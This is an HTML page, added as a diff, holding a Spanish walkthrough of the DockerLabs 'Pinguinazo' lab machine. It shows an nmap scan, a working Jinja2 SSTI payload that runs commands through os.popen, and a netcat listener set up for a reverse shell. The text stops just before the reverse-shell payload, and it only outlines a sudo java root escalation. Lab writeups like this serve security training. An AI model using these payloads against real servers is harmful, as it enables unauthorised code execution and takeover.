@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pinguinazo — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Pinguinazo de DockerLabs — Dificultad: Fácil. SSTI Jinja2 en Flask → reverse shell → sudo java → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:       #050a0e;
+      --bg2:      #080f14;
+      --bg3:      #0a1520;
+      --green:    #00ff88;
+      --cyan:     #00e5ff;
+      --red:      #ff2d55;
+      --yellow:   #ffd700;
+      --orange:   #ff8c00;
+      --purple:   #bf5fff;
+      --dim:      #1a2a2e;
+      --text:     #c8d8e0;
+      --text-dim: #4a6a74;
+      --font-mono:'Share Tech Mono', monospace;
+      --font-main:'Rajdhani', sans-serif;
+      --font-disp:'Orbitron', sans-serif;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:var(--font-main);overflow-x:hidden;cursor:none;}
+    body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px);pointer-events:none;z-index:1000;}
+    a,button{cursor:none;}
+    .cursor{position:fixed;width:10px;height:10px;background:var(--green);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 12px var(--green);opacity:0;}
+    .cursor-ring{position:fixed;width:36px;height:36px;border:1px solid var(--green);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);opacity:0;transition:all .12s ease;}
+    nav{position:fixed;top:0;left:0;right:0;z-index:500;display:flex;justify-content:space-between;align-items:center;padding:1.2rem 4rem;background:rgba(5,10,14,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(0,255,136,.08);}
+    .nav-logo{font-family:var(--font-disp);font-size:1rem;color:var(--green);letter-spacing:4px;text-decoration:none;}
+    .nav-back{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);text-decoration:none;letter-spacing:2px;transition:color .3s;}
+    .nav-back::before{content:'← ';}
+    .nav-back:hover{color:var(--green);}
+
+    .writeup-hero{min-height:42vh;display:flex;align-items:flex-end;padding:8rem 4rem 3rem;position:relative;overflow:hidden;border-bottom:1px solid var(--dim);}
+    .hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);background-size:60px 60px;}
+    .hero-glow{position:absolute;width:600px;height:400px;background:radial-gradient(ellipse,rgba(0,255,136,.07) 0%,transparent 70%);top:0;left:0;pointer-events:none;}
+    .writeup-hero-content{position:relative;z-index:2;max-width:900px;}
+    .breadcrumb{font-family:var(--font-mono);font-size:.72rem;color:var(--text-dim);letter-spacing:2px;margin-bottom:1.2rem;}
+    .breadcrumb a{color:var(--text-dim);text-decoration:none;transition:color .2s;}
+    .breadcrumb a:hover{color:var(--green);}
+    .breadcrumb span{color:var(--green);}
+    .writeup-title{font-family:var(--font-disp);font-size:clamp(2.5rem,6vw,4.5rem);font-weight:900;letter-spacing:2px;line-height:1.1;}
+    .writeup-title span{color:var(--green);}
+    .writeup-subtitle{font-family:var(--font-mono);font-size:.85rem;color:var(--text-dim);margin-top:.8rem;letter-spacing:1px;}
+    .writeup-meta{display:flex;flex-wrap:wrap;gap:1rem;align-items:center;margin-top:1.8rem;}
+    .meta-badge{font-family:var(--font-mono);font-size:.68rem;letter-spacing:2px;padding:.3rem .8rem;border:1px solid;}
+    .badge-facil  {color:var(--green); border-color:rgba(0,255,136,.4); background:rgba(0,255,136,.05);}
+    .badge-docker {color:var(--green); border-color:rgba(0,255,136,.3); background:rgba(0,255,136,.05);}
+    .badge-linux  {color:var(--yellow);border-color:rgba(255,215,0,.3);  background:rgba(255,215,0,.05);}
+    .badge-ssti   {color:var(--red);   border-color:rgba(255,45,85,.4);  background:rgba(255,45,85,.05);}
+    .badge-java   {color:var(--orange);border-color:rgba(255,140,0,.4);  background:rgba(255,140,0,.05);}
+    .meta-date{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);}
+
+    .writeup-layout{display:grid;grid-template-columns:1fr 240px;gap:3rem;max-width:1300px;margin:0 auto;padding:4rem;}
+    .sidebar{position:sticky;top:5rem;height:fit-content;order:2;}
+    .sidebar-box{border:1px solid var(--dim);padding:1.5rem;background:var(--bg2);margin-bottom:1.5rem;}
+    .sidebar-title{font-family:var(--font-mono);font-size:.65rem;color:var(--green);letter-spacing:3px;margin-bottom:1.2rem;}
+    .toc-list{list-style:none;display:flex;flex-direction:column;gap:.4rem;}
+    .toc-list a{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);text-decoration:none;letter-spacing:1px;transition:all .2s;display:block;padding:.25rem .8rem;border-left:2px solid transparent;}
+    .toc-list a:hover,.toc-list a.active{color:var(--green);border-left-color:var(--green);}
+    .info-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:.8rem;}
+    .info-label{font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);letter-spacing:1px;}
+    .info-val{font-family:var(--font-mono);font-size:.72rem;}
+    .val-green {color:var(--green);}
+    .val-yellow{color:var(--yellow);}
+    .val-red   {color:var(--red);}
+    .val-orange{color:var(--orange);}
+
+    .attack-path{display:flex;flex-direction:column;gap:0;}
+    .ap-item{display:flex;align-items:flex-start;gap:.8rem;padding:.5rem 0;}
+    .ap-dot{width:8px;height:8px;background:var(--green);border-radius:50%;margin-top:4px;flex-shrink:0;box-shadow:0 0 6px var(--green);}
+    .ap-line{width:1px;height:16px;background:rgba(0,255,136,.2);margin:0 3.5px;}
+    .ap-text{font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);line-height:1.5;}
+    .ap-text span{color:var(--green);}
+
+    .writeup-content{min-width:0;order:1;}
+    .progress-container{position:fixed;top:0;left:0;width:100%;height:3px;background:transparent;z-index:1001;}
+    .progress-bar{height:100%;background:var(--green);width:0%;transition:width .15s ease;box-shadow:0 0 8px var(--green);}
+    .skip-link{position:absolute;top:-40px;left:0;background:var(--green);color:var(--bg);padding:8px 16px;z-index:10000;text-decoration:none;font-family:var(--font-mono);font-size:.8rem;transition:top .2s;}
+    .skip-link:focus{top:0;}
+
+    .copy-btn{position:absolute;top:.5rem;right:4.5rem;background:var(--dim);border:1px solid rgba(0,255,136,.3);color:var(--text-dim);font-family:var(--font-mono);font-size:.62rem;padding:.15rem .5rem;letter-spacing:1px;cursor:none;opacity:0;transition:opacity .2s,background .2s,color .2s;z-index:10;white-space:nowrap;}
+    .cmd-block:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{background:var(--green);color:var(--bg);border-color:var(--green);}
+    .copy-btn.copied{background:var(--green);color:var(--bg);border-color:var(--green);opacity:1;}
+    .toast{position:fixed;bottom:24px;right:24px;background:var(--green);color:#000;padding:.7rem 1.4rem;font-family:var(--font-mono);font-size:.75rem;letter-spacing:2px;font-weight:600;opacity:0;transform:translateY(8px);transition:opacity .25s,transform .25s;pointer-events:none;z-index:10000;}
+    .toast.show{opacity:1;transform:translateY(0);}
+
+    .section{margin-bottom:4rem;opacity:0;transform:translateY(20px);transition:opacity .5s ease,transform .5s ease;}
+    .section.visible{opacity:1;transform:translateY(0);}
+    .section-label{font-family:var(--font-mono);font-size:.68rem;color:var(--green);letter-spacing:4px;margin-bottom:.5rem;}
+    .section-title{font-family:var(--font-disp);font-size:1.5rem;font-weight:700;letter-spacing:2px;margin-bottom:.6rem;}
+    .section-line{width:40px;height:2px;background:var(--green);margin-bottom:2rem;}
+
+    .prose p{font-size:1.05rem;line-height:1.9;color:var(--text-dim);margin-bottom:1rem;}
+    .prose p strong{color:var(--text);}
+    .prose p .hl    {color:var(--green);font-weight:bold;}
+    .prose p .hl-red{color:var(--red);}
+    .prose p .hl-yel{color:var(--yellow);}
+    .prose p .hl-ora{color:var(--orange);}
+    .prose p .hl-pur{color:var(--purple);}
+
+    .step-marker{display:flex;align-items:center;gap:1rem;margin-bottom:1.2rem;margin-top:2.5rem;}
+    .step-num{font-family:var(--font-disp);font-size:.65rem;color:var(--bg);background:var(--green);width:26px;height:26px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:900;}
+    .step-title{font-family:var(--font-mono);font-size:.8rem;color:var(--green);letter-spacing:2px;}
+
+    .cmd-block{background:var(--bg3);border:1px solid rgba(0,255,136,.15);border-left:3px solid var(--green);padding:1rem 1.2rem;margin:1rem 0;font-family:var(--font-mono);font-size:.82rem;overflow-x:auto;position:relative;line-height:1.8;}
+    .cmd-block .cmd-label{position:absolute;top:.5rem;right:.8rem;font-size:.6rem;color:var(--text-dim);letter-spacing:2px;}
+    .cmd-block .prompt     {color:var(--green);user-select:none;}
+    .cmd-block .prompt-ssh {color:var(--yellow);user-select:none;}
+    .cmd-block .prompt-root{color:var(--red);user-select:none;}
+    .cmd-block .cmd  {color:var(--text);}
+    .cmd-block .flag {color:var(--green);}
+    .cmd-block .arg  {color:var(--yellow);}
+    .cmd-block .ssti {color:var(--red);}
+    .cmd-block .comment{color:var(--text-dim);font-size:.75rem;}
+
+    .output-block{background:#020608;border:1px solid var(--dim);padding:1rem 1.2rem;margin:.5rem 0 1.5rem;font-family:var(--font-mono);font-size:.77rem;line-height:1.9;color:var(--text-dim);overflow-x:auto;}
+    .output-block .o-green {color:var(--green);}
+    .output-block .o-red   {color:var(--red);}
+    .output-block .o-yellow{color:var(--yellow);}
+    .output-block .o-orange{color:var(--orange);}
+    .output-block .o-white {color:var(--text);}
+
+    .info-box{border:1px solid rgba(0,255,136,.2);background:rgba(0,255,136,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .info-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--green);letter-spacing:3px;margin-bottom:.6rem;}
+    .info-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .info-box p strong{color:var(--green);}
+
+    .warn-box{border:1px solid rgba(255,140,0,.25);background:rgba(255,140,0,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .warn-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--orange);letter-spacing:3px;margin-bottom:.6rem;}
+    .warn-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .warn-box p strong{color:var(--orange);}
+
+    .vuln-box{border:1px solid rgba(255,45,85,.3);background:rgba(255,45,85,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .vuln-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--red);letter-spacing:3px;margin-bottom:.6rem;}
+    .vuln-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .vuln-box p strong{color:var(--red);}
+
+    .vuln-table{width:100%;border-collapse:collapse;margin:1.5rem 0;}
+    .vuln-table th,.vuln-table td{font-family:var(--font-mono);font-size:.72rem;padding:.8rem 1rem;text-align:left;border-bottom:1px solid var(--dim);}
+    .vuln-table th{color:var(--green);letter-spacing:2px;border-bottom-color:rgba(0,255,136,.2);}
+    .vuln-table td{color:var(--text-dim);}
+    .vuln-table td:first-child{color:var(--green);}
+
+    hr.divider{border:none;height:1px;background:linear-gradient(90deg,rgba(0,255,136,.3),transparent);margin:3rem 0;}
+
+    .cmd-ref-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.5rem;}
+    .cmd-ref-card{border:1px solid var(--dim);background:var(--bg2);padding:1.5rem;transition:border-color .3s;}
+    .cmd-ref-card:hover{border-color:rgba(0,255,136,.25);}
+    .cmd-ref-name{font-family:var(--font-mono);font-size:.9rem;color:var(--green);margin-bottom:.5rem;letter-spacing:1px;}
+    .cmd-ref-syntax{font-family:var(--font-mono);font-size:.72rem;color:var(--green);background:var(--bg3);padding:.4rem .7rem;margin-bottom:.8rem;display:inline-block;}
+    .cmd-ref-desc{font-size:.92rem;color:var(--text-dim);line-height:1.7;margin-bottom:.8rem;}
+    .cmd-ref-flags{list-style:none;display:flex;flex-direction:column;gap:.3rem;}
+    .cmd-ref-flags li{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);}
+    .cmd-ref-flags li span{color:var(--yellow);}
+
+    .glosario-grid{display:grid;grid-template-columns:1fr;gap:1rem;margin-top:1.5rem;}
+    .glos-card{border:1px solid var(--dim);background:var(--bg2);padding:1.4rem 1.5rem;transition:border-color .3s;}
+    .glos-card:hover{border-color:rgba(0,255,136,.2);}
+    .glos-term{font-family:var(--font-mono);font-size:.88rem;color:var(--green);margin-bottom:.4rem;letter-spacing:1px;}
+    .glos-def{font-size:.95rem;color:var(--text-dim);line-height:1.75;}
+    .glos-def strong{color:var(--text);}
+    .glos-def code{font-family:var(--font-mono);font-size:.82rem;color:var(--green);background:var(--bg3);padding:.1rem .4rem;}
+
+    footer{padding:2rem 4rem;border-top:1px solid var(--dim);display:flex;justify-content:space-between;align-items:center;margin-top:4rem;}
+    footer p{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);letter-spacing:1px;}
+    footer span{color:var(--green);}
+
+    @media(max-width:960px){
+      nav,.writeup-hero,footer{padding-left:1.5rem;padding-right:1.5rem;}
+      .writeup-layout{grid-template-columns:1fr;padding:2rem 1.5rem;}
+      .sidebar{position:static;}
+      .cmd-ref-grid{grid-template-columns:1fr;}
+      body,a,button{cursor:auto;}
+      .cursor,.cursor-ring{display:none;}
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/dockerlabs/">dockerlabs</a> /
+      <span>pinguinazo</span>
+    </p>
+    <h1 class="writeup-title"><span>Pinguinazo</span></h1>
+    <p class="writeup-subtitle">DockerLabs — Linux · SSTI Jinja2 en Flask → reverse shell → sudo java → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-ssti">SSTI · Jinja2</span>
+      <span class="meta-badge badge-java">sudo · Java</span>
+      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#despliegue">02 · Despliegue</a></li>
+        <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
+        <li><a href="#ssti">04 · SSTI Jinja2</a></li>
+        <li><a href="#revshell">05 · Reverse Shell</a></li>
+        <li><a href="#privesc">06 · Escalada · sudo Java</a></li>
+        <li><a href="#referencia">07 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">08 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-green">DockerLabs</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-green">Fácil</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux</span></div>
+      <div class="info-row"><span class="info-label">IP</span><span class="info-val val-green">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">PUERTO</span><span class="info-val val-green">5000 / HTTP</span></div>
+      <div class="info-row"><span class="info-label">INITIAL</span><span class="info-val val-red">SSTI</span></div>
+      <div class="info-row"><span class="info-label">PRIVESC</span><span class="info-val val-orange">sudo java</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puerto 5000 Flask</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSTI</span> Jinja2 → RCE como pinguinazo</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Reverse shell</span> via payload SSTI</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>sudo -l</span> → /usr/bin/java NOPASSWD</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>GTFObins</span> java Shell.class → root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section visible" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen Ejecutivo</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          <strong>Pinguinazo</strong> es una máquina de dificultad <span class="hl">Fácil</span> de DockerLabs
+          diseñada para practicar <span class="hl">Server-Side Template Injection (SSTI)</span> en aplicaciones
+          Python/Flask con Jinja2, y escalada de privilegios abusando de <span class="hl">sudo java</span>.
+          El servidor expone únicamente el puerto <span class="hl">5000</span> con una aplicación Flask
+          llamada <em>PinguRegistro</em> que renderiza directamente la entrada del usuario en una plantilla
+          Jinja2 — condición suficiente para lograr RCE sin autenticación.
+        </p>
+        <p>
+          Una vez dentro como el usuario <span class="hl">pinguinazo</span>, <code style="color:var(--green)">sudo -l</code>
+          revela que puede ejecutar <code style="color:var(--green)">/usr/bin/java</code> como cualquier usuario sin
+          contraseña. Siguiendo la técnica de <strong>GTFObins</strong> para Java con Sudo, compilamos un pequeño
+          programa Java que spawna una shell con <code style="color:var(--green)">ProcessBuilder</code>,
+          lo ejecutamos con <code style="color:var(--green)">sudo java Shell</code> y obtenemos acceso como
+          <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Despliegue</td><td>auto_deploy.sh pinguinazo.tar</td><td>Contenedor activo en 172.17.0.2</td></tr>
+          <tr><td>Reconocimiento</td><td>nmap -p- -sSCV + xsltproc</td><td>Puerto 5000 · Werkzeug Flask (Python 3.12.3)</td></tr>
+          <tr><td>Enumeración Web</td><td>Navegador → :5000</td><td>Formulario PinguRegistro — entrada reflejada sin sanitizar</td></tr>
+          <tr><td>Explotación</td><td>SSTI Jinja2 via cycler.__init__</td><td>RCE como usuario pinguinazo</td></tr>
+          <tr><td>Reverse Shell</td><td>Payload SSTI + nc -nlvp 4444</td><td>Shell interactiva como pinguinazo</td></tr>
+          <tr><td>PrivEsc</td><td>sudo java + Shell.java + GTFObins</td><td>Shell como root</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- DESPLIEGUE -->
+    <div class="section" id="despliegue">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Despliegue del Laboratorio</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">LANZAR EL CONTENEDOR DOCKERLABS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desplegamos la máquina con el script de DockerLabs. El contenedor arranca y nos asigna
+          la IP <span class="hl">172.17.0.2</span>. El proceso queda en primer plano
+          y se detiene con <strong>Ctrl+C</strong> cuando terminemos.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh pinguinazo.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DEPLOY</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">pinguinazo.tar</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">Estamos desplegando la máquina vulnerable, espere un momento.</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">Máquina desplegada, su dirección IP es ─→ 172.17.0.2</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-red">Presiona Ctrl+C cuando termines con la máquina para eliminarla</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          El escaneo revela un único puerto abierto: el <span class="hl">5000/tcp</span> con
+          <span class="hl">Werkzeug httpd 3.0.1</span> corriendo sobre <strong>Python 3.12.3</strong>.
+          El título de la página es <em>Pingu Flask Web</em>, confirmando que se trata de una
+          aplicación Flask. El servidor Werkzeug en producción es una señal de que la app puede
+          estar en modo desarrollo o mal configurada.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX pinguinazo.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">pinguinazo.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:42 -0400</div>
+        <div>Nmap scan report for 172.17.0.2</div>
+        <div>Host is up (0.0000050s latency).</div>
+        <div>Not shown: 65534 closed tcp ports (reset)</div>
+        <div>&nbsp;</div>
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-green">5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)</span></div>
+        <div>|_http-title: Pingu Flask Web</div>
+        <div>|_http-server-header: Werkzeug/3.0.1 Python/3.12.3</div>
+        <div>MAC Address: BE:AD:E0:19:3F:F4 (Unknown)</div>
+        <div>&nbsp;</div>
+        <div>Service detection performed.</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">GENERAR REPORTE HTML CON XSLTPROC</span>
+      </div>
+      <div class="prose">
+        <p>
+          Convertimos el XML de Nmap a un reporte HTML legible usando la hoja de estilos XSL
+          incluida con Nmap. Esto nos permite revisar el escaneo cómodamente en el navegador.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl pinguinazo.xml > pinguinazo.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">pinguinazo.xml</span> &gt; <span class="arg">pinguinazo.html</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">INSPECCIÓN DE LA APLICACIÓN WEB</span>
+      </div>
+      <div class="prose">
+        <p>
+          Abrimos <span class="hl">http://172.17.0.2:5000/</span> en el navegador. Encontramos
+          el formulario <strong>PinguRegistro</strong> con campos: PinguNombre, PinguCumple,
+          PinguEmail y PinguPhone. Al ser una app Flask con Jinja2, probamos si el campo
+          <em>PinguNombre</em> es vulnerable a <span class="hl">SSTI</span> inyectando
+          una expresión matemática de prueba.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DETECCIÓN DE SSTI</p>
+        <p>El test clásico para SSTI en Jinja2 es <strong>{{"{{"}}7*7{{"}}"}}</strong>. Si la aplicación renderiza
+        <strong>49</strong> en la respuesta en lugar del string literal, el motor de plantillas está
+        evaluando nuestra entrada — confirmando SSTI.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SSTI -->
+    <div class="section" id="ssti">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Server-Side Template Injection (SSTI)</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">PAYLOAD SSTI — VERIFICACIÓN DE RCE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Confirmada la SSTI, usamos un payload más avanzado que aprovecha el objeto
+          <code style="color:var(--green)">self._TemplateReference__context</code> de Jinja2
+          para acceder al módulo <code style="color:var(--green)">os</code> a través del ciclo
+          de vida de los objetos de contexto. El payload ejecuta <code style="color:var(--green)">id</code>
+          en el servidor y nos devuelve el resultado en la respuesta HTTP.
+        </p>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// PAYLOAD DE VERIFICACIÓN</p>
+        <p>Este payload no requiere <strong>__builtins__</strong> y funciona directamente sobre cualquier objeto en el contexto de Jinja2:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSTI PAYLOAD</span>
+        <div><span class="ssti">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">uid=1000(pinguinazo) gid=1000(pinguinazo) groups=1000(pinguinazo)</span></div>
+      </div>
+
+      <div class="prose">
+        <p>
+          El servidor ejecuta el comando y devuelve que estamos corriendo como el usuario
+          <span class="hl">pinguinazo</span>. Tenemos ejecución remota de código confirmada.
+          El siguiente paso es obtener una reverse shell interactiva.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REVERSE SHELL -->
+    <div class="section" id="revshell">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Reverse Shell</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">IDENTIFICAR NUESTRA IP DE ATACANTE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de generar la reverse shell necesitamos conocer nuestra IP en la interfaz Docker.
+          Ejecutamos <code style="color:var(--green)">ifconfig</code> y localizamos la IP de la
+          interfaz <span class="hl">eth0</span>: <span class="hl">192.168.111.128</span>. Esta
+          será la IP a la que el contenedor se conectará de vuelta.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ifconfig">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">IFCONFIG</span>
+        <div><span class="prompt">$ </span><span class="cmd">ifconfig</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="o-green">inet 192.168.111.128</span>  netmask 255.255.255.0  broadcast 192.168.111.255</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ether 00:0c:29:88:af:27  txqueuelen 1000  (Ethernet)</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">PONERSE EN ESCUCHA CON NETCAT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Abrimos un listener en el puerto <span class="hl">4444</span> de nuestra máquina
+          atacante con Netcat. Este proceso queda esperando la conexión entrante del contenedor.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -nlvp 4444">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTENER</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-nlvp</span> <span class="arg">4444</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] 4444 ...</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ENVIAR PAYLOAD DE REVERSE SHELL VÍA SSTI</span>
+      </div>
+      <div class="prose">
+        <p>
+          Usamos el mismo vector SSTI pero ahora el comando es una reverse shell Bash. El payload
+          generado con <a href="https://www.revshells.com" style="color:var(--green)">revshells.com</a>
+          (tipo Bash -i) establece la conexión a nuestra IP y puerto. Lo pegamos en el campo
